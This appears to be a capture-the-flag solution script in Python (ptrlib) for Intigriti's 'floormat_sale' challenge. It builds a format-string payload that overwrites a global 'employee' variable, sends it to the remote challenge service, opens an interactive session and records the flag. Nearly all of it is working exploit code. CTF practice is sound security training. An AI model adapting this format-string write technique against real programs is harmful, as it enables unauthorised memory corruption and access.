from ptrlib import *

file = "./floormat_sale"
e = ELF(file)
#sock = Process(file)
sock = Socket("nc floormatsale.ctf.intigriti.io 1339")
#sock.debug = True

# > disass employee_access
# 0x00000000004011ce <+8>:     mov    eax,DWORD PTR [rip+0x2eb8]        # 0x40408c <employee>
addr_employee = 0x40408c

#writes = {0x40408c: 0xdeadbeef}
writes = {addr_employee: 0xdeadbeef}
payload = fsb(
        pos=10,
        writes=writes,
        bs=1,
        bits=64
)

def choice(num):
    sock.recvuntil("choice:")
    sock.sendline(num)

print(f"{len(payload)=}")

choice("6")
sock.recvuntil("address:")
sock.sendline(payload)

try:
    sock.recvuntil("delivered to:")
    print(sock.recvline())
except:
    print("[-] try again")

sock.sh()

# INTIGRITI{3v3ry_fl00rm47_mu57_60!!}
